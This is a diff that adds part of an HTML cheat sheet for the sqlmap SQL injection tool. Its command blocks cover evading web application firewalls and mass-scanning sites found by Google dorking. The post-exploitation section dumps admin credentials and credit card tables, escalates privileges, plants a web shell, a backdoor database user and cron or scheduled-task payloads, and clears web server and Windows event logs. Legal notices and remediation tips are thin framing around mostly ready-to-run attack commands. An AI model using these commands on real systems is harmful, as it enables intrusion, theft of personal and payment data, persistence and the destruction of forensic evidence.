+  --tamper=between,randomcase,space2comment</span>
+
+<span class="command"># CloudFlare bypass</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
+  --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes</span>
+
+<span class="command"># ModSecurity bypass</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
+  --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes</span></pre>
+                </div>
+            </div>
+
+            <h3>Popular Tamper Scripts</h3>
+            <table class="option-table">
+                <thead>
+                    <tr>
+                        <th>Tamper Script</th>
+                        <th>Purpose</th>
+                        <th>Example Transformation</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>space2comment</td>
+                        <td>Replace spaces with comments</td>
+                        <td>SELECT/**/FROM/**/users</td>
+                    </tr>
+                    <tr>
+                        <td>randomcase</td>
+                        <td>Randomize character case</td>
+                        <td>SeLeCt * FrOm UsErS</td>
+                    </tr>
+                    <tr>
+                        <td>between</td>
+                        <td>Replace equals with BETWEEN</td>
+                        <td>id BETWEEN 1 AND 1</td>
+                    </tr>
+                    <tr>
+                        <td>charencode</td>
+                        <td>URL encode characters</td>
+                        <td>%53%45%4C%45%43%54</td>
+                    </tr>
+                    <tr>
+                        <td>base64encode</td>
+                        <td>Base64 encode payload</td>
+                        <td>U0VMRUNUKg==</td>
+                    </tr>
+                    <tr>
+                        <td>equaltolike</td>
+                        <td>Replace = with LIKE</td>
+                        <td>username LIKE 'admin'</td>
+                    </tr>
+                    <tr>
+                        <td>space2plus</td>
+                        <td>Replace spaces with +</td>
+                        <td>SELECT+*+FROM+users</td>
+                    </tr>
+                    <tr>
+                        <td>unionalltounion</td>
+                        <td>Replace UNION ALL with UNION</td>
+                        <td>UNION SELECT</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Request Manipulation</h3>
+            <div class="code-block">
+                <pre><span class="command"># Custom delay between requests</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --delay=3</span>
+
+<span class="command"># Random delay (1-3 seconds)</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --delay=1 --timeout=3</span>
+
+<span class="command"># Reduce thread count</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --threads=1</span>
+
+<span class="command"># HTTP parameter pollution</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --hpp</span>
+
+<span class="command"># Skip URL encoding</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --skip-urlencode</span></pre>
+            </div>
+
+            <h3>Advanced Evasion</h3>
+            <div class="attack-vector risk-medium">
+                <h4>Chunked Transfer and Mobile Agents</h4>
+                <div class="code-block">
+                    <pre><span class="command"># Chunked transfer encoding</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --chunked</span>
+
+<span class="command"># Mobile User-Agent</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
+  --mobile --random-agent</span>
+
+<span class="command"># Custom payload encoding</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
+  --tamper=charencode --level=3 --risk=2</span>
+
+<span class="command"># Tor proxy for anonymity</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
+  --tor --tor-port=9050 --check-tor</span></pre>
+                </div>
+            </div>
+
+            <h3>Custom Tamper Script Example</h3>
+            <div class="code-block">
+                <pre><span class="command"># Create custom tamper script</span>
+<span class="comment"># File: custom_tamper.py</span>
+<span style="color: #ccc;">#!/usr/bin/env python
+
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.LOW
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    """
+    Custom tamper script example
+    Replace spaces with /**/ comments and randomize case
+    """
+    if payload:
+        payload = payload.replace(" ", "/**/")
+        payload = "".join(char.upper() if i % 2 else char.lower() 
+                         for i, char in enumerate(payload))
+    return payload</span>
+
+<span class="command"># Use custom tamper script</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
+  --tamper=/path/to/custom_tamper.py</span></pre>
+            </div>
+        </section>
+
+        <section id="automation" class="section">
+            <h2>Automation & Scripting</h2>
+
+            <h3>Batch Testing with Lists</h3>
+            <div class="attack-vector risk-medium">
+                <h4>Mass Scanning</h4>
+                <div class="code-block">
+                    <pre><span class="command"># Test multiple URLs from file</span>
+<span class="command">python sqlmap.py -m urls.txt --batch --random-agent</span>
+
+<span class="command"># Google dorking integration</span>
+<span class="command">python sqlmap.py -g "inurl:php?id=" --random-agent --batch</span>
+
+<span class="command"># Crawling and testing</span>
+<span class="command">python sqlmap.py -u "http://target.com" --crawl=3 --batch</span>
+
+<span class="command"># Sitemap parsing</span>
+<span class="command">python sqlmap.py -u "http://target.com/sitemap.xml" --batch</span></pre>
+                </div>
+            </div>
+
+            <h3>Automated Enumeration Script</h3>
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-buttons">
+                        <div class="terminal-button close"></div>
+                        <div class="terminal-button minimize"></div>
+                        <div class="terminal-button maximize"></div>
+                    </div>
+                    <span style="color: #ccc; margin-left: 10px;">auto_sqlmap.sh</span>
+                </div>
+                <div class="terminal-content">
+                    <pre><span style="color: #00ffff;">#!/bin/bash</span>
+<span style="color: #ccc;"># Automated SQLMap Testing Script</span>
+
+<span style="color: #ff6b6b;">TARGET_URL</span>=<span style="color: #ffff00;">"$1"</span>
+<span style="color: #ff6b6b;">OUTPUT_DIR</span>=<span style="color: #ffff00;">"sqlmap_results_$(date +%Y%m%d_%H%M%S)"</span>
+
+<span style="color: #00ff41;">if</span> [[ -z <span style="color: #ffff00;">"$TARGET_URL"</span> ]]; <span style="color: #00ff41;">then</span>
+    <span style="color: #ff0080;">echo</span> <span style="color: #ffff00;">"Usage: $0 <target_url>"</span>
+    <span style="color: #ff0080;">exit</span> 1
+<span style="color: #00ff41;">fi</span>
+
+<span style="color: #ff0080;">mkdir</span> -p <span style="color: #ffff00;">"$OUTPUT_DIR"</span>
+<span style="color: #ff0080;">cd</span> <span style="color: #ffff00;">"$OUTPUT_DIR"</span>
+
+<span style="color: #ccc;"># Phase 1: Initial vulnerability check</span>
+<span style="color: #ff0080;">echo</span> <span style="color: #ffff00;">"[*] Phase 1: Testing for SQL injection..."</span>
+python3 /opt/sqlmap/sqlmap.py -u <span style="color: #ffff00;">"$TARGET_URL"</span> --batch --random-agent --level=3 --risk=2 > initial_test.log
+
+<span style="color: #ccc;"># Phase 2: Database enumeration if vulnerable</span>
+<span style="color: #00ff41;">if</span> grep -q <span style="color: #ffff00;">"vulnerable"</span> initial_test.log; <span style="color: #00ff41;">then</span>
+    <span style="color: #ff0080;">echo</span> <span style="color: #ffff00;">"[+] Vulnerability found! Starting enumeration..."</span>
+    
+    <span style="color: #ccc;"># Get basic info</span>
+    python3 /opt/sqlmap/sqlmap.py -u <span style="color: #ffff00;">"$TARGET_URL"</span> --banner --current-user --current-db --batch > basic_info.log
+    
+    <span style="color: #ccc;"># List databases</span>
+    python3 /opt/sqlmap/sqlmap.py -u <span style="color: #ffff00;">"$TARGET_URL"</span> --dbs --batch > databases.log
+    
+    <span style="color: #ccc;"># Extract database names</span>
+    <span style="color: #ff6b6b;">DATABASES</span>=$(grep -E '^\[\*\]' databases.log | sed 's/\[\*\] //' | grep -v 'information_schema\|mysql\|performance_schema')
+    
+    <span style="color: #00ff41;">for</span> <span style="color: #ff6b6b;">db</span> <span style="color: #00ff41;">in</span> $DATABASES; <span style="color: #00ff41;">do</span>
+        <span style="color: #ff0080;">echo</span> <span style="color: #ffff00;">"[*] Enumerating database: $db"</span>
+        python3 /opt/sqlmap/sqlmap.py -u <span style="color: #ffff00;">"$TARGET_URL"</span> -D <span style="color: #ffff00;">"$db"</span> --tables --batch > <span style="color: #ffff00;">"${db}_tables.log"</span>
+    <span style="color: #00ff41;">done</span>
+<span style="color: #00ff41;">else</span>
+    <span style="color: #ff0080;">echo</span> <span style="color: #ffff00;">"[-] No SQL injection vulnerability found."</span>
+<span style="color: #00ff41;">fi</span></pre>
+                </div>
+            </div>
+
+            <h3>Python Integration Script</h3>
+            <div class="code-block">
+                <pre><span class="command">#!/usr/bin/env python3</span>
+<span class="comment"># SQLMap Python Automation Script</span>
+
+<span style="color: #00ffff;">import</span> subprocess
+<span style="color: #00ffff;">import</span> json
+<span style="color: #00ffff;">import</span> sys
+<span style="color: #00ffff;">import</span> time
+<span style="color: #00ffff;">from</span> datetime <span style="color: #00ffff;">import</span> datetime
+
+<span style="color: #00ffff;">class</span> <span style="color: #ffff00;">SQLMapAutomator</span>:
+    <span style="color: #00ffff;">def</span> <span style="color: #44ff44;">__init__</span>(<span style="color: #ff6b6b;">self</span>, target_url):
+        <span style="color: #ff6b6b;">self</span>.target = target_url
+        <span style="color: #ff6b6b;">self</span>.sqlmap_path = <span style="color: #ffff00;">"/opt/sqlmap/sqlmap.py"</span>
+        <span style="color: #ff6b6b;">self</span>.results = {}
+        
+    <span style="color: #00ffff;">def</span> <span style="color: #44ff44;">run_sqlmap</span>(<span style="color: #ff6b6b;">self</span>, args):
+        <span style="color: #ccc;">"""Execute SQLMap with given arguments"""</span>
+        cmd = [<span style="color: #ffff00;">"python3"</span>, <span style="color: #ff6b6b;">self</span>.sqlmap_path, <span style="color: #ffff00;">"-u"</span>, <span style="color: #ff6b6b;">self</span>.target] + args
+        try:
+            result = subprocess.run(cmd, capture_output=<span style="color: #44ff44;">True</span>, text=<span style="color: #44ff44;">True</span>, timeout=300)
+            return result.stdout, result.stderr, result.returncode
+        except subprocess.TimeoutExpired:
+            return <span style="color: #ffff00;">""</span>, <span style="color: #ffff00;">"Timeout expired"</span>, 1
+    
+    <span style="color: #00ffff;">def</span> <span style="color: #44ff44;">test_vulnerability</span>(<span style="color: #ff6b6b;">self</span>):
+        <span style="color: #ccc;">"""Test for SQL injection vulnerability"""</span>
+        print(<span style="color: #ffff00;">f"[*] Testing {self.target} for SQL injection..."</span>)
+        stdout, stderr, code = <span style="color: #ff6b6b;">self</span>.run_sqlmap([<span style="color: #ffff00;">"--batch"</span>, <span style="color: #ffff00;">"--level=3"</span>, <span style="color: #ffff00;">"--risk=2"</span>])
+        
+        <span style="color: #00ffff;">if</span> <span style="color: #ffff00;">"is vulnerable"</span> in stdout:
+            print(<span style="color: #ffff00;">"[+] SQL injection vulnerability detected!"</span>)
+            <span style="color: #ff6b6b;">self</span>.results[<span style="color: #ffff00;">"vulnerable"</span>] = <span style="color: #44ff44;">True</span>
+            return <span style="color: #44ff44;">True</span>
+        else:
+            print(<span style="color: #ffff00;">"[-] No SQL injection vulnerability found."</span>)
+            <span style="color: #ff6b6b;">self</span>.results[<span style="color: #ffff00;">"vulnerable"</span>] = <span style="color: #44ff44;">False</span>
+            return <span style="color: #44ff44;">False</span>
+    
+    <span style="color: #00ffff;">def</span> <span style="color: #44ff44;">enumerate_databases</span>(<span style="color: #ff6b6b;">self</span>):
+        <span style="color: #ccc;">"""Enumerate available databases"""</span>
+        print(<span style="color: #ffff00;">"[*] Enumerating databases..."</span>)
+        stdout, stderr, code = <span style="color: #ff6b6b;">self</span>.run_sqlmap([<span style="color: #ffff00;">"--dbs"</span>, <span style="color: #ffff00;">"--batch"</span>])
+        
+        <span style="color: #ccc;"># Parse database names from output</span>
+        databases = []
+        lines = stdout.split(<span style="color: #ffff00;">'\n'</span>)
+        for line in lines:
+            <span style="color: #00ffff;">if</span> line.startswith(<span style="color: #ffff00;">"[*] "</span>):
+                db_name = line.replace(<span style="color: #ffff00;">"[*] "</span>, <span style="color: #ffff00;">""</span>).strip()
+                <span style="color: #00ffff;">if</span> db_name not in [<span style="color: #ffff00;">"information_schema"</span>, <span style="color: #ffff00;">"mysql"</span>, <span style="color: #ffff00;">"performance_schema"</span>]:
+                    databases.append(db_name)
+        
+        <span style="color: #ff6b6b;">self</span>.results[<span style="color: #ffff00;">"databases"</span>] = databases
+        print(<span style="color: #ffff00;">f"[+] Found {len(databases)} databases"</span>)
+        return databases
+    
+    <span style="color: #00ffff;">def</span> <span style="color: #44ff44;">generate_report</span>(<span style="color: #ff6b6b;">self</span>):
+        <span style="color: #ccc;">"""Generate JSON report"""</span>
+        report = {
+            <span style="color: #ffff00;">"target"</span>: <span style="color: #ff6b6b;">self</span>.target,
+            <span style="color: #ffff00;">"timestamp"</span>: datetime.now().isoformat(),
+            <span style="color: #ffff00;">"results"</span>: <span style="color: #ff6b6b;">self</span>.results
+        }
+        
+        filename = <span style="color: #ffff00;">f"sqlmap_report_{int(time.time())}.json"</span>
+        with open(filename, <span style="color: #ffff00;">'w'</span>) as f:
+            json.dump(report, f, indent=2)
+        
+        print(<span style="color: #ffff00;">f"[+] Report saved to {filename}"</span>)
+
+<span style="color: #00ffff;">if</span> __name__ == <span style="color: #ffff00;">"__main__"</span>:
+    <span style="color: #00ffff;">if</span> len(sys.argv) != 2:
+        print(<span style="color: #ffff00;">"Usage: python3 sqlmap_auto.py <target_url>"</span>)
+        sys.exit(1)
+    
+    automator = SQLMapAutomator(sys.argv[1])
+    <span style="color: #00ffff;">if</span> automator.test_vulnerability():
+        automator.enumerate_databases()
+    automator.generate_report()</pre>
+            </div>
+
+            <h3>Configuration Files</h3>
+            <div class="attack-vector risk-low">
+                <h4>SQLMap Configuration</h4>
+                <div class="code-block">
+                    <pre><span class="command"># Create sqlmap.conf configuration file</span>
+<span style="color: #ccc;">[Target]
+url = http://target.com/page?id=1
+data = 
+cookie = 
+headers = User-Agent: Custom Agent 1.0
+
+[Request]
+method = GET
+delay = 1
+timeout = 30
+retries = 3
+randomAgent = True
+mobile = False
+
+[Detection]
+level = 3
+risk = 2
+techniques = BEUST
+dbms = 
+os = 
+
+[Enumeration]
+getBanner = True
+getCurrentUser = True
+getCurrentDb = True
+getDbs = True
+getTables = True
+getColumns = True
+getUsers = False
+getPasswordHashes = False
+
+[Brute force]
+commonTables = True
+commonColumns = True
+
+[File system]
+fileRead = 
+fileWrite = 
+fileDest = 
+
+[Injection]
+tamper = 
+prefix = 
+suffix = 
+skip = 
+testParameter = 
+
+[Advanced]
+threads = 1
+verbose = 1
+batch = True
+flushSession = False
+freshQueries = False
+hexConvert = False
+outputDir = /tmp/sqlmap_output</span>
+
+<span class="command"># Use configuration file</span>
+<span class="command">python sqlmap.py --config=sqlmap.conf</span></pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="post-exploitation" class="section">
+            <h2>Post-Exploitation</h2>
+
+            <h3>Data Exfiltration Strategies</h3>
+            <div class="attack-vector risk-high">
+                <h4>Sensitive Data Extraction</h4>
+                <div class="code-block">
+                    <pre><span class="command"># Target sensitive tables</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" -D "webapp" \
+  --sql-query "SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%user%' OR table_name LIKE '%admin%' OR table_name LIKE '%password%'"</span>
+
+<span class="command"># Extract user credentials</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" -D "webapp" -T "users" \
+  -C "username,password,email" --dump --where "role='admin'"</span>
+
+<span class="command"># Search for credit card data</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" -D "webapp" \
+  --sql-query "SELECT * FROM payment_info WHERE cc_number IS NOT NULL LIMIT 10"</span>
+
+<span class="command"># Extract configuration data</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" -D "webapp" \
+  --sql-query "SELECT * FROM config WHERE config_key LIKE '%api%' OR config_key LIKE '%secret%'"</span></pre>
+                </div>
+            </div>
+
+            <h3>Privilege Escalation</h3>
+            <div class="code-block">
+                <pre><span class="command"># Check current user privileges</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --privileges</span>
+
+<span class="command"># Check if current user is DBA</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --is-dba</span>
+
+<span class="command"># Attempt privilege escalation (MySQL)</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --priv-esc</span>
+
+<span class="command"># UDF injection for root access</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --udf-inject --shared-lib=/tmp/lib_mysqludf_sys.so</span></pre>
+            </div>
+
+            <h3>Persistence Mechanisms</h3>
+            <div class="attack-vector risk-high">
+                <h4>Maintaining Access</h4>
+                <div class="terminal-window">
+                    <div class="terminal-header">
+                        <div class="terminal-buttons">
+                            <div class="terminal-button close"></div>
+                            <div class="terminal-button minimize"></div>
+                            <div class="terminal-button maximize"></div>
+                        </div>
+                        <span style="color: #ccc; margin-left: 10px;">Persistence Techniques</span>
+                    </div>
+                    <div class="terminal-content">
+                        <div><span style="color: #00ffff;"># 1. Web shell upload</span></div>
+                        <div>python sqlmap.py -u "target" --file-write="webshell.php" --file-dest="/var/www/html/admin/shell.php"</div>
+                        <br>
+                        <div><span style="color: #00ffff;"># 2. Create backdoor user (MySQL)</span></div>
+                        <div>python sqlmap.py -u "target" --sql-query "CREATE USER 'backdoor'@'%' IDENTIFIED BY 'P@ssw0rd123'"</div>
+                        <div>python sqlmap.py -u "target" --sql-query "GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%'"</div>
+                        <br>
+                        <div><span style="color: #00ffff;"># 3. Scheduled task creation (Windows)</span></div>
+                        <div>python sqlmap.py -u "target" --os-cmd "schtasks /create /tn Updater /tr C:\\temp\\payload.exe /sc daily"</div>
+                        <br>
+                        <div><span style="color: #00ffff;"># 4. Cron job (Linux)</span></div>
+                        <div>python sqlmap.py -u "target" --os-cmd "echo '0 2 * * * /tmp/backdoor.sh' | crontab -"</div>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Log Cleaning and Anti-Forensics</h3>
+            <div class="code-block">
+                <pre><span class="command"># Clear MySQL query logs</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
+  --sql-query "SET GLOBAL general_log = 'OFF'"</span>
+
+<span class="command"># Clear web server logs</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
+  --os-cmd "echo '' > /var/log/apache2/access.log"</span>
+
+<span class="command"># Clear Windows event logs</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
+  --os-cmd "wevtutil cl System && wevtutil cl Security && wevtutil cl Application"</span>
+
+<span class="command"># Timestomp files (modify timestamps)</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
+  --os-cmd "touch -r /etc/passwd /tmp/uploaded_file.txt"</span></pre>
+            </div>
+
+            <div class="warning risk-high">
+                <strong>⚠️ Legal Notice:</strong> Post-exploitation activities must only be performed on systems you own or have explicit written authorization to test. Log cleaning and persistence mechanisms are serious security violations if performed without proper authorization.
+            </div>
+        </section>
+
+        <section id="troubleshooting" class="section">
+            <h2>Troubleshooting</h2>
+
+            <h3>Common Issues and Solutions</h3>
+            <div class="feature-grid">
+                <div class="feature-card">
+                    <h4>Connection Problems</h4>
+                    <div class="code-block">
+                        <pre><span class="command"># SSL certificate issues</span>
+<span class="command">python sqlmap.py -u "https://target.com/page?id=1" --disable-coloring --force-ssl</span>
+
+<span class="command"># Timeout problems</span>
+<span class="command">python sqlmap.py -u "target" --timeout=60 --retries=5</span>
+
+<span class="command"># Proxy configuration</span>
+<span class="command">python sqlmap.py -u "target" --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass"</span></pre>
+                    </div>
+                </div>
+                <div class="feature-card">
+                    <h4>WAF Detection</h4>
+                    <div class="code-block">
+                        <pre><span class="command"># Identify WAF</span>
+<span class="command">python sqlmap.py -u "target" --identify-waf</span>
+
+<span class="command"># Bypass common WAFs</span>
+<span class="command">python sqlmap.py -u "target" --tamper=space2comment,randomcase</span>
+
+<span class="command"># Skip WAF detection</span>
+<span class="command">python sqlmap.py -u "target" --skip-waf</span></pre>
+                    </div>
+                </div>
+                <div class="feature-card">
+                    <h4>False Positives</h4>
+                    <div class="code-block">
+                        <pre><span class="command"># Verify injection point</span>
+<span class="command">python sqlmap.py -u "target" --string="Welcome" --not-string="Error"</span>
+
+<span class="command"># Text-only responses</span>
+<span class="command">python sqlmap.py -u "target" --text-only</span>
+
+<span class="command"># Custom regex filtering</span>
+<span class="command">python sqlmap.py -u "target" --regexp="[a-zA-Z0-9]+"</span></pre>
+                    </div>
+                </div>
+                <div class="feature-card">
+                    <h4>Performance Issues</h4>
+                    <div class="code-block">
+                        <pre><span class="command"># Optimize threads</span>
+<span class="command">python sqlmap.py -u "target" --threads=5 --delay=1</span>
+
+<span class="command"># Resume interrupted sessions</span>
+<span class="command">python sqlmap.py -u "target" --resume</span>
+
+<span class="command"># Skip static content</span>
+<span class="command">python sqlmap.py -u "target" --skip-static</span></pre>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Error Messages and Solutions</h3>
+            <table class="option-table">
+                <thead>
+                    <tr>
+                        <th>Error Message</th>
+                        <th>Cause</th>
+                        <th>Solution</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Connection timed out</td>
+                        <td>Network issues or rate limiting</td>
+                        <td>--timeout=60 --delay=3 --retries=3</td>
+                    </tr>
+                    <tr>
+                        <td>403 Forbidden</td>
+                        <td>WAF blocking requests</td>
+                        <td>--tamper=randomcase --random-agent</td>
+                    </tr>
+                    <tr>
+                        <td>No parameter(s) found</td>
+                        <td>Missing injectable parameters</td>
+                        <td>-p parameter_name or --data="param=value"</td>
+                    </tr>
+                    <tr>
+                        <td>Unable to connect</td>
+                        <td>Invalid URL or network issue</td>
+                        <td>Check URL format and connectivity</td>
+                    </tr>
+                    <tr>
+                        <td>Detected WAF/IPS</td>
+                        <td>Security system interference</td>
+                        <td>--tamper=between,randomcase --delay=5</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Debug and Logging</h3>
+            <div class="code-block">
+                <pre><span class="command"># Enable verbose output</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" -v 6</span>
+
+<span class="command"># Save all traffic</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --save="traffic.log"</span>
+
+<span class="command"># Debug payload generation</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --debug</span>
+
+<span class="command"># Test single payload</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --test-filter="MySQL boolean-based blind"</span>
+
+<span class="command"># Replay traffic log</span>
+<span class="command">python sqlmap.py -l "traffic.log"</span></pre>
+            </div>
+
+            <div class="info">
+                <strong>ℹ️ Debugging Tips:</strong>
+                <ul style="margin-top: 10px; color: #ccc;">
+                    <li>Use verbose mode (-v 6) to see all HTTP requests</li>
+                    <li>Save traffic logs for analysis and replay</li>
+                    <li>Test individual payloads to isolate issues</li>
+                    <li>Check SQLMap's temp directory for generated files</li>
+                    <li>Use Wireshark to capture actual network traffic</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="best-practices" class="section">
+            <h2>Best Practices & Legal Guidelines</h2>
+
+            <h3>Ethical Testing Framework</h3>
+            <div class="warning risk-high">
+                <strong>⚠️ Legal Requirements:</strong>
+                <ul style="margin-top: 15px; color: #ccc;">
+                    <li><strong>Written Authorization:</strong> Always obtain explicit written permission before testing</li>
+                    <li><strong>Scope Definition:</strong> Clearly define testing boundaries and limitations</li>
+                    <li><strong>Data Handling:</strong> Establish protocols for sensitive data discovered during testing</li>
+                    <li><strong>Reporting:</strong> Provide detailed findings and remediation recommendations</li>
+                    <li><strong>Compliance:</strong> Ensure testing complies with local laws and regulations</li>
+                </ul>
+            </div>
+
+            <h3>Professional Testing Methodology</h3>
+            <div class="feature-grid">
+                <div class="feature-card">
+                    <h4>1. Reconnaissance Phase</h4>
+                    <div class="code-block">
+                        <pre><span class="command"># Identify web technology</span>
+<span class="command">whatweb target.com</span>
+
+<span class="command"># Check for WAF</span>
+<span class="command">python sqlmap.py -u "target" --identify-waf</span>
+
+<span class="command"># Initial vulnerability scan</span>
+<span class="command">python sqlmap.py -u "target" --batch --level=1 --risk=1</span></pre>
+                    </div>
+                </div>
+                <div class="feature-card">
+                    <h4>2. Testing Phase</h4>
+                    <div class="code-block">
+                        <pre><span class="command"># Comprehensive scan</span>
+<span class="command">python sqlmap.py -u "target" --level=3 --risk=2 --batch</span>
+
+<span class="command"># Multiple injection techniques</span>
+<span class="command">python sqlmap.py -u "target" --technique=BEUST</span>
+
+<span class="command"># Custom tamper scripts</span>
+<span class="command">python sqlmap.py -u "target" --tamper=randomcase,space2comment</span></pre>
+                    </div>
+                </div>
+                <div class="feature-card">
+                    <h4>3. Exploitation Phase</h4>
+                    <div class="code-block">
+                        <pre><span class="command"># Database enumeration</span>
+<span class="command">python sqlmap.py -u "target" --dbs --tables --columns</span>
+
+<span class="command"># Sensitive data extraction</span>
+<span class="command">python sqlmap.py -u "target" -D db -T users --dump</span>
+
+<span class="command"># System access (if authorized)</span>
+<span class="command">python sqlmap.py -u "target" --os-shell</span></pre>
+                    </div>
+                </div>
+                <div class="feature-card">
+                    <h4>4. Documentation Phase</h4>
+                    <div class="code-block">
+                        <pre><span class="command"># Generate comprehensive report</span>
+<span class="command">python sqlmap.py -u "target" --batch --output-dir=report/</span>
+
+<span class="command"># Export findings</span>
+<span class="command">python sqlmap.py -u "target" --dump --csv-del="," > findings.csv</span>
+
+<span class="command"># Clean up evidence</span>
+<span class="command">python sqlmap.py --purge-output</span></pre>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Security Recommendations</h3>
+            <div class="attack-vector risk-medium">
+                <h4>Remediation Guidelines</h4>
+                <div class="success">
+                    <strong>✅ Preventive Measures:</strong>
+                    <ul style="margin-top: 15px; color: #ccc;">
+                        <li><strong>Parameterized Queries:</strong> Use prepared statements and parameterized queries</li>
+                        <li><strong>Input Validation:</strong> Implement strict input validation and sanitization</li>
+                        <li><strong>Least Privilege:</strong> Database users should have minimal required permissions</li>
+                        <li><strong>WAF Implementation:</strong> Deploy Web Application Firewall with SQL injection rules</li>
+                        <li><strong>Regular Updates:</strong> Keep database software and frameworks updated</li>
+                        <li><strong>Error Handling:</strong> Implement proper error handling without information disclosure</li>
+                        <li><strong>Database Hardening:</strong> Disable unnecessary features and services</li>
+                        <li><strong>Network Security:</strong> Implement proper network segmentation</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>Professional Reporting Template</h3>
+            <div class="code-block">
+                <pre><span style="color: #ccc;">EXECUTIVE SUMMARY
+================
+Target: [URL/Application]
+Date: [Testing Date]
+Tester: [Security Professional]
+Authorization: [Reference to written permission]
+
+VULNERABILITY OVERVIEW
+======================
+Critical: [Number] - Immediate attention required
+High: [Number] - Should be addressed within 1 week
+Medium: [Number] - Should be addressed within 1 month
+Low: [Number] - Should be addressed as time permits
+
+TECHNICAL FINDINGS
+==================
+1. SQL Injection Vulnerability
+   Location: [Parameter/URL]
+   Method: [GET/POST/Cookie/Header]
+   Database: [Type and Version]
+   Impact: [Data extraction, system access, etc.]
+   
+   Proof of Concept:
+   [SQLMap command used]
+   [Sample output/evidence]
+   
+   Remediation:
+   - Implement parameterized queries
+   - Add input validation
+   - Apply least privilege principle
+   - Deploy WAF rules
+
+APPENDIX
+========
+- Full SQLMap output logs
+- Database schema information
+- Extracted sample data (sanitized)
+- Recommended security controls</span></pre>
+            </div>
+
+            <h3>Continuous Security Testing</h3>
+            <div class="attack-vector risk-low">
+                <h4>Automated Security Pipeline</h4>
+                <div class="terminal-window">
+                    <div class="terminal-header">
+                        <div class="terminal-buttons">
+                            <div class="terminal-button close"></div>
+                            <div class="terminal-button minimize"></div>
+                            <div class="terminal-button maximize"></div>
+                        </div>
+                        <span style="color: #ccc; margin-left: 10px;">CI/CD Security Integration</span>
+                    </div>
+                    <div class="terminal-content">
+                        <pre><span style="color: #00ffff;"># Jenkins Pipeline Example</span>
+<span style="color: #ccc;">pipeline {</span>
+    <span style="color: #ff6b6b;">agent</span> <span style="color: #ccc;">any</span>
+    
+    <span style="color: #ff6b6b;">stages</span> <span style="color: #ccc;">{</span>
+        <span style="color: #ff6b6b;">stage</span>(<span style="color: #ffff00;">'Deploy to Staging'</span>) <span style="color: #ccc;">{</span>
+            <span style="color: #ff6b6b;">steps</span> <span style="color: #ccc;">{</span>
+                <span style="color: #44ff44;">sh</span> <span style="color: #ffff00;">'deploy-to-staging.sh'</span>
+            <span style="color: #ccc;">}</span>
+        <span style="color: #ccc;">}</span>
+        
+        <span style="color: #ff6b6b;">stage</span>(<span style="color: #ffff00;">'SQL Injection Test'</span>) <span style="color: #ccc;">{</span>
+            <span style="color: #ff6b6b;">steps</span> <span style="color: #ccc;">{</span>
+                <span style="color: #44ff44;">script</span> <span style="color: #ccc;">{</span>
+                    <span style="color: #ff6b6b;">def</span> result = <span style="color: #44ff44;">sh</span>(
+                        <span style="color: #ff6b6b;">script</span>: <span style="color: #ffff00;">'python3 sqlmap.py -u "${STAGING_URL}" --batch --level=2 --risk=1'</span>,
+                        <span style="color: #ff6b6b;">returnStatus</span>: <span style="color: #44ff44;">true</span>
+                    )
+                    
+                    <span style="color: #00ff41;">if</span> (result == 0 && <span style="color: #44ff44;">sh</span>(<span style="color: #ffff00;">'grep -q "vulnerable" sqlmap.log'</span>)) {
+                        error(<span style="color: #ffff00;">'SQL injection vulnerability detected!'</span>)
+                    }
+                <span style="color: #ccc;">}</span>
+            <span style="color: #ccc;">}</span>
+        <span style="color: #ccc;">}</span>
+        
